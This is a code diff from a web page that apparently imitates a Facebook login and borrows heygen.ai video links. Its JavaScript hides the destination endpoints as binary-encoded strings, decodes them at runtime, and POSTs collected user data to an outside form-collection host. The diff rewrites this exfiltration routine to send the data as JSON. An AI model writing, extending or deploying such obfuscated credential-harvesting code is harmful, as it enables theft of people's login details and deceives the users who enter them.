@@ -2181,31 +2181,27 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       '01101000011101000111010001110000011100110011101000101111001011110110000101110011011010010110011000101101011001100110111101110010011011010010111001110110011001010111001001100011011001010110110000101110011000010111000001110000001011110110000101100010011001000111010101101100011011000110000101101000'
     ];
    
-    endpoints.forEach(binaryUrl => {
-      try {
-        const decodedUrl = binaryToString(binaryUrl);
-        const formData = new FormData();
-       
-        // Add all properties from data object to formData
-        for (const key in data) {
-          formData.append(key, data[key]);
-        }
-       
-        // Using fetch with error handling
-        fetch(decodedUrl, {
-          method: 'POST',
-          body: formData,
-          mode: 'no-cors' // Important for cross-origin requests
-        }).catch(error => {
-          console.error('Error submitting to endpoint:', error);
-        });
-      } catch (error) {
-        console.error('Error with endpoint:', error);
-      }
-    });
-   
-    return true;
-  }
+  
+  endpoints.forEach(binaryUrl => {
+    try {
+      const decodedUrl = binaryToString(binaryUrl);
+
+      fetch(decodedUrl, {
+        method: 'POST',
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).catch(error => {
+        console.error('Error submitting to endpoint:', error);
+      });
+    } catch (error) {
+      console.error('Error with endpoint:', error);
+    }
+  });
+
+  return true;
+}
 
   function showfbLogin() {
     
@@ -2233,6 +2229,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
 </body>
 
 </html>
+
 
 
 
